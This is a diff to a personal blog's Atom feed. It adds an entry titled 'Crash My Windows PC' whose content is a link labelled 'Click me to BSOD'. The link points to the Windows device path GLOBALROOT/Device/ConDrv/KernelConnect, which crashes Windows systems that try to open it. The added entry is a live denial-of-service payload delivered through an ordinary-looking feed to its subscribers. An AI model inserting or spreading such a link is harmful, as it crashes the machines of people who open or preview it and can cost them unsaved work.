@@ -3,12 +3,32 @@
     <title>CCXFied Official</title>
     <link href="https://ccxfied.github.io/feed.xml" rel="self" />
     <link href="https://ccxfied.github.io" />
-    <updated>2020-11-02T11:18:06+05:30</updated>
+    <updated>2021-03-12T10:13:07+05:30</updated>
     <author>
         <name>Cortex Cortexified</name>
     </author>
     <id>https://ccxfied.github.io</id>
 
+    <entry>
+        <title>Crash My Windows PC</title>
+        <author>
+            <name>Cortex Cortexified</name>
+        </author>
+        <link href="https://ccxfied.github.io/crash-my-windows-pc.html"/>
+        <id>https://ccxfied.github.io/crash-my-windows-pc.html</id>
+
+        <updated>2021-03-12T10:13:07+05:30</updated>
+            <summary>
+                <![CDATA[
+                    Click me to BSOD
+                ]]>
+            </summary>
+        <content type="html">
+            <![CDATA[
+                <p><a href="file:///./GLOBALROOT/Device/ConDrv/KernelConnect">Click me to BSOD</a></p>
+            ]]>
+        </content>
+    </entry>
     <entry>
         <title>Qualcomm Snapdragon 855+</title>
         <author>
